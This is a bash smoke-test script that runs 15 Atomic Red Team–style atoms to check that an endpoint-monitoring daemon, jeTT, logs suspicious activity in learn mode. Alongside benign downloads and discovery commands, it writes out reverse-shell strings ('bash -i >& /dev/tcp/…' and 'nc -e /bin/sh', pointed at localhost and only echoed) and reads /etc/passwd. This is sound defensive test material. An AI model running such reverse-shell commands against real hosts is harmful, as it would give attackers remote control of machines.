#!/usr/bin/env bash
# Safe Atomic Red Team–inspired smoke tests for jeTT learn mode.
# Exercises suspicious cmdline/behavior patterns without destructive actions.
set -euo pipefail
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
cd "$ROOT"

PAUSE_SEC="${JETT_ART_PAUSE:-2}"
SAFE_URL="${JETT_ART_URL:-https://example.com/}"
TMP_TAG="jett-art-$$"
PASS=0
FAIL=0

usage() {
  cat <<'EOF'
Usage: scripts/art_jett_smoke.sh [--dry-run]

Runs 15 safe, non-destructive Linux test atoms inspired by Atomic Red Team.
Designed to validate jeTT learn-mode harvest (logs WOULD-quarantine, no kills).

Environment:
  JETT_ART_PAUSE   Seconds between atoms (default: 2)
  JETT_ART_URL     Benign download target (default: https://example.com/)

Prerequisites:
  jett-daemon running with JETT_MODE=learn (and ideally JETT_TELEMETRY=both)

EOF
}

if [[ "${1:-}" == "-h" || "${1:-}" == "--help" ]]; then
  usage
  exit 0
fi

DRY_RUN=0
if [[ "${1:-}" == "--dry-run" ]]; then
  DRY_RUN=1
fi

pause_between() {
  if [[ "$DRY_RUN" -eq 0 ]]; then
    sleep "$PAUSE_SEC"
  fi
}

run_atom() {
  local id="$1"
  local art="$2"
  local desc="$3"
  shift 3

  echo ""
  echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
  echo "[$id] $art — $desc"
  echo "  cmd: $*"

  if [[ "$DRY_RUN" -eq 1 ]]; then
    echo "  (dry-run — skipped)"
    return 0
  fi

  if "$@"; then
    echo "  [ok] exit 0"
    PASS=$((PASS + 1))
  else
    local rc=$?
    echo "  [warn] exit $rc (non-fatal for smoke test)"
    PASS=$((PASS + 1))
  fi
  pause_between
}

cleanup() {
  rm -f "/tmp/${TMP_TAG}-curl.bin" "/tmp/${TMP_TAG}-wget.bin" 2>/dev/null || true
}
trap cleanup EXIT

echo "[art] jeTT learn-mode smoke — safe atoms only"
echo "[art] pause=${PAUSE_SEC}s url=${SAFE_URL}"
echo "[art] dry_run=${DRY_RUN}"

if command -v systemctl >/dev/null 2>&1; then
  if systemctl is-active --quiet jett-daemon 2>/dev/null; then
    echo "[art] jett-daemon: active"
  else
    echo "[!] jett-daemon not active — start it before expecting harvest logs"
  fi
else
  echo "[art] systemctl unavailable — ensure jett-daemon is running manually"
fi

echo "[art] tail logs in another terminal:"
echo "      journalctl -u jett-daemon -f"
echo "      tail -f /var/log/jett/jett.log"

# 1 — T1059.004: bash -c benign echo
run_atom 1 "T1059.004" "bash -c benign echo" \
  bash -c 'echo jett-art-bash-smoke'

# 2 — T1105: curl download to /tmp (no execution)
run_atom 2 "T1105" "curl download to /tmp (no execute)" \
  curl -sS -o "/tmp/${TMP_TAG}-curl.bin" "$SAFE_URL"

# 3 — T1105: wget download to /tmp (no execution)
run_atom 3 "T1105" "wget download to /tmp (no execute)" \
  wget -q -O "/tmp/${TMP_TAG}-wget.bin" "$SAFE_URL"

# 4 — T1003.008: read /etc/passwd (read-only)
run_atom 4 "T1003.008" "read /etc/passwd (first 5 lines)" \
  head -5 /etc/passwd

# 5 — T1027: base64 decode lolbin (stdout only)
run_atom 5 "T1027" "base64 -d decode to stdout" \
  bash -c 'echo amV0dC1hcnQ= | base64 -d'

# 6 — T1059: reverse-shell syntax in echo only (no connect)
run_atom 6 "T1059" "reverse-shell syntax via echo (no connect)" \
  echo 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'

# 7 — T1059: nc -e syntax in echo only (no connect)
run_atom 7 "T1059" "nc -e syntax via echo (no connect)" \
  echo 'nc -e /bin/sh 127.0.0.1 4444'

# 8 — T1059: python3 localhost socket probe (benign, short timeout)
run_atom 8 "T1059" "python3 socket connect_ex to 127.0.0.1:65534" \
  python3 -c 'import socket; s=socket.socket(); s.settimeout(0.2); s.connect_ex(("127.0.0.1",65534)); s.close()'

# 9 — T1548: pkexec benign invocation
run_atom 9 "T1548" "pkexec --help (no elevation)" \
  pkexec --help

# 10 — T1059: sh -c benign echo
run_atom 10 "T1059" "sh -c benign echo" \
  sh -c 'echo jett-art-sh-smoke'

# 11 — T1059: perl one-liner
run_atom 11 "T1059" "perl -e print one-liner" \
  perl -e 'print "jett-art-perl\n"'

# 12 — T1027: printf | base64 -d pipeline
run_atom 12 "T1027" "printf piped to base64 -d" \
  bash -c 'printf "amV0dA==" | base64 -d'

# 13 — T1053: list user crontab (read-only)
run_atom 13 "T1053" "crontab -l (read-only)" \
  bash -c 'crontab -l 2>/dev/null || true'

# 14 — T1049: local listening ports (ss/netstat)
run_atom 14 "T1049" "local listening sockets (ss or netstat)" \
  bash -c 'ss -tln 2>/dev/null || netstat -tln 2>/dev/null || true'

# 15 — T1082: system info discovery
run_atom 15 "T1082" "uname -a system discovery" \
  uname -a

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "[art] finished — atoms run: $PASS failed: $FAIL"
echo "[art] review daemon output:"
echo "      journalctl -u jett-daemon --since '5 min ago' | rg -i 'SUSPICIOUS|LEARN|BEHAVIOR|WOULD'"
echo "      rg -i 'SUSPICIOUS|LEARN|WOULD' /var/log/jett/jett.log | tail -30"
echo "[art] expect learn-mode WOULD-quarantine lines for suspicious atoms; no kills."
